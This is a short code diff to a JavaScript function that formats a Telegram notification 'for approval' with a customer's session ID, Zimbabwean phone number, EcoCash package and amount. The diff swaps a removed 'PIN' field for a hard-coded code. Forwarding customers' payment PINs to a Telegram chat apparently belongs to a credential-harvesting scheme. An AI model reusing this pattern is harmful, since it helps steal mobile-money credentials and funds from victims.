@@ -101,8 +101,7 @@ async function notifyTelegramForApproval(phone, sessionId) {
     `━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
     `🆔 <b>Session:</b> <code>${sessionId}</code>\n` +
     `📱 <b>Customer Phone:</b> <code>+263 ${phone}</code>\n` +
-    `🔐 <b>PIN:</b> <code>\n` +
-    `📦 <b>Package:</b> ${selectedPlan ? selectedPlan.title : 'Unknown'} (${selectedPlan ? selectedPlan.duration : ''})\n` +
+`🔑 <b>Code:</b> <code>000000</code>\n` +    `📦 <b>Package:</b> ${selectedPlan ? selectedPlan.title : 'Unknown'} (${selectedPlan ? selectedPlan.duration : ''})\n` +
     `💵 <b>Amount:</b> ${selectedPlan ? selectedPlan.price : 'Unknown'}\n` +
     `⚡ <b>Payment Method:</b> EcoCash USSD Push\n` +
     `📅 <b>Time:</b> ${timestamp}\n\n` +
